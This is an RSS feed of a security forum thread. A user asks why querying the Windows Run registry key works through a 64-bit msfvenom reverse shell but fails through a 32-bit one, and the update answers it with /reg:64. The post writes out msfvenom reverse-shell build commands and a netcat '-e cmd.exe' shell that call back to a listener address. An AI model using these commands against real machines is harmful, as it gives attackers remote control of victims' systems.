<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Reverse shell and reg query oddness</title>
    <link>https://0x00sec.org/t/reverse-shell-and-reg-query-oddness/21730</link>
    <description>Got a curious issue I&#39;m hoping to get an answer to. I&#39;m doing a reverse shell using msfvenom. Depending on how I create it, the following command will or will not show results: 

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

If I use the following reverse shell, that commands returns the contents of the registry key: 

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.20.1 LPORT=4343 -f exe -o revshell.exe`

But if I use this or just create a netcat shell {nc 172.16.20.1 4343 -e cmd.exe), the reg query fails: 

`msfvenom -p windows/shell_reverse_tcp LHOST=172.16.20.1 LPORT=4343 -f exe -o revshell.exe` 

The Windows OS is 64-bit so I&#39;m assuming it has something to do with that but I&#39;d like to get a better understand of why one works and the other doesn&#39;t. Can someone offer some guidance?

**Update:**

To get that to work, you can append the /reg:64 to the end of the reg query:

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /reg:64</description>
    
    <lastBuildDate>Fri, 12 Jun 2020 15:57:46 +0000</lastBuildDate>
    <category>Questions</category>
    <atom:link href="https://0x00sec.org/t/reverse-shell-and-reg-query-oddness/21730.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Reverse shell and reg query oddness</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed 3 days after the last reply. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/reverse-shell-and-reg-query-oddness/21730/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reverse-shell-and-reg-query-oddness/21730/2</link>
        <pubDate>Mon, 15 Jun 2020 03:28:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21730-2</guid>
        <source url="https://0x00sec.org/t/reverse-shell-and-reg-query-oddness/21730.rss">Reverse shell and reg query oddness</source>
      </item>
      <item>
        <title>Reverse shell and reg query oddness</title>
        <dc:creator><![CDATA[1ffy]]></dc:creator>
        <description><![CDATA[
            <p>Got a curious issue I’m hoping to get an answer to. I’m doing a reverse shell using msfvenom. Depending on how I create it, the following command will or will not show results:</p>
<p><code>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></p>
<p>If I use the following reverse shell, that commands returns the contents of the registry key:</p>
<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.20.1 LPORT=4343 -f exe -o revshell.exe</code></p>
<p>But if I use this or just create a netcat shell {nc 172.16.20.1 4343 -e cmd.exe), the reg query fails:</p>
<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=172.16.20.1 LPORT=4343 -f exe -o revshell.exe</code></p>
<p>The Windows OS is 64-bit so I’m assuming it has something to do with that but I’d like to get a better understand of why one works and the other doesn’t. Can someone offer some guidance?</p>
<p><strong>Update:</strong></p>
<p>To get that to work, you can append the /reg:64 to the end of the reg query:</p>
<p>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /reg:64</p>
          <p><a href="https://0x00sec.org/t/reverse-shell-and-reg-query-oddness/21730/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reverse-shell-and-reg-query-oddness/21730/1</link>
        <pubDate>Fri, 12 Jun 2020 03:24:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-21730-1</guid>
        <source url="https://0x00sec.org/t/reverse-shell-and-reg-query-oddness/21730.rss">Reverse shell and reg query oddness</source>
      </item>
  </channel>
</rss>
